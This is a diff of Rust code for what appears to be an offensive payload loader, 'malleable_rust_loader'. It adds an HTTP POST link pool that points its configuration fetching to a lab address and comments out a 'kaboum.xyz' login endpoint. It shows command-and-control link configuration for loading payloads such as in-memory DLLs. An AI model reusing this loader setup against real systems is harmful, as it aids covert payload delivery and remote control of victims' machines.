@@ -9,6 +9,7 @@ use malleable_rust_loader::defuse::Hostname;
 use malleable_rust_loader::defuse::Operator;
 use malleable_rust_loader::link::FileLink;
 use malleable_rust_loader::link::HTTPLink;
+use malleable_rust_loader::link::HTTPPostLink;
 use malleable_rust_loader::link::Link;
 use malleable_rust_loader::link::MemoryLink;
 use malleable_rust_loader::payload::DllFromMemory;
@@ -212,7 +213,44 @@ exec(decoded_script)
         panic!()
     }
 
+    let pool_links: BTreeMap<u64, (String, PoolLinks)> = BTreeMap::from([
+        (
+            1,
+            (
+                "kaboum.xyz first links".to_string(),
+                PoolLinks {
+                    pool_mode: PoolMode::ADVANCED(Advanced {
+                        random: 0,          // fetch only x random link from pool and ignore the other, (0 not set)
+                        max_link_broken: 0, // how many accepted link broken before switch to next pool if no conf found, (0 not set)
+                        parallel: true,     // try to fetch every link in the same time, if not its one by one
+                        linear: true,       // fetch link in the order or randomized
+                        stop_same: false,   // stop if found the same conf -> not for parallel
+                        stop_new: false,    // stop if found a new conf -> not for parallel
+                        accept_old: false,  // accept conf older than the active one -> true not recommended, need to fight against hypothetic valid config replay.
+                    }),
+                    pool_links: vec![
+                        /*
+                        Link::HTTPost(HTTPPostLink {
+                            url: String::from("https://kaboum.xyz/admin/login.php"),
+                            dataoperation: vec![],
+                            jitt: 0,
+                            sleep: 0,
+                        }), */
+                        Link::HTTPost(HTTPPostLink {
+                            url: String::from("http://192.168.56.1:3000/login.php"),
+                            dataoperation: vec![],
+                            dataoperation_post: vec![],
+                            jitt: 0,
+                            sleep: 0,
+                        }),
+                    ],
+                },
+            ),
+        )
+    ]);
+
     //let pool_links: BTreeMap<u64, (String, PoolLinks)> = BTreeMap::new();
+    /* 
     let pool_links: BTreeMap<u64, (String, PoolLinks)> = BTreeMap::from([
         (
             1,
@@ -294,6 +332,7 @@ exec(decoded_script)
             ),
         ),
     ]);
+    */
 
     // payload is define, now, CREATE the
     info!("[+] LOAD ed25519 keypair from {:?}", keypair);
